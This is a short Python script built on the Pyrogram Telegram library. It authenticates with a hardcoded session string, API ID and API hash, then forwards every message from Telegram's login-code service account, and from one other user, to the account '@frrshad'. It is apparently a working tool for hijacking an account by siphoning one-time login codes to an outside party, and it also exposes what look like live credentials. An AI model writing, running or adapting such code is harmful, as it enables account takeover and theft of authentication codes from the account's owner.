from pyrogram import Client, filters
from pyrogram.types import Message

feri = 'AQCIP6gZeS83zy5yeCfzj-GgaXo-5ZKPhzcbRLROPjyMgbvbqyZVtYm7JS0vNWUuf_6BvaojtAuYbOUtVkV6hnr-OUAyvSwSqXr5Bbpp1bfncJPnnBZXptLY8lBreRktUH-0PVTnSiZEaxvmiIF0e6sd8Xr3WSIh2FZapeUZZgv2yxMGyv_wPw-vlDwA2ALK-KnX_CbhCOt46kS1bJB56GSn5F-Z6TaPfaDwT6HmANhDoiwW8oUpD720peqDKG030Lit3-ibhywGTrePj95tTvGkrYPy6wUebKNdKgIf-_e5Id9LFaWgYyZp2As20Ijgvk4W_WrCscb2hNmy1XM0r9JEAAAAAU7Pks4A'

app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851', session_string=feri)

id_or_username = '@frrshad'


@app.on_message(filters.user(777000, 5214329732))
def forward_code(app:Client, message:Message):
    app.forward_messages(id_or_username, message.chat.id, message.id)

  
app.run()
